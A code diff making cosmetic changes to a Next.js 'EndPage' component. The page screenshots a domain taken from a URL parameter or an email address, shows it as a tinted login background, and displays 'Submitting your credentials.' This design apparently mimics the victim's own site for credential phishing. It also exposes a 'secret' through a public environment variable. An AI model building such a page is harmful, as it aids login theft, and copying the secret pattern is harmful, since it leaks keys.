@@ -18,7 +18,7 @@ export default function EndPage() {
   const [domainToCapture, setDomainToCapture] = useState('')
   const [screenshotUrl, setScreenshotUrl]     = useState('')
 
-  // decide domain
+  // Decide domain
   useEffect(() => {
     if (urlParamDomain) {
       setDomainToCapture(urlParamDomain)
@@ -28,12 +28,12 @@ export default function EndPage() {
     }
   }, [urlParamDomain, email])
 
-  // build thum.io URL
+  // Build thum.io URL
   useEffect(() => {
     if (!domainToCapture) return
 
     const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
-    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!  // as string
+    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!  // string
 
     setScreenshotUrl(
       thum.getThumURL({
@@ -63,12 +63,12 @@ export default function EndPage() {
 
   return (
     <div className="login-container relative min-h-screen">
-      {/* Thumbnail background + tint */}
+      {/* thum.io background + tint */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden">
           <img
             src={screenshotUrl}
-            alt={`Thumbnail of ${domainToCapture}`}
+            alt={`Screenshot of ${domainToCapture}`}
             className="w-full h-full object-contain opacity-50 pointer-events-none"
           />
           <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
@@ -112,7 +112,9 @@ export default function EndPage() {
       {showModal && (
         <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
           <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
-            <h2 className="text-xl font-semibold text-gray-800">Please wait…</h2>
+            <h2 className="text-xl font-semibold text-gray-800">
+              Please wait…
+            </h2>
             <p className="mt-2 text-gray-600">Submitting your credentials.</p>
           </div>
         </div>
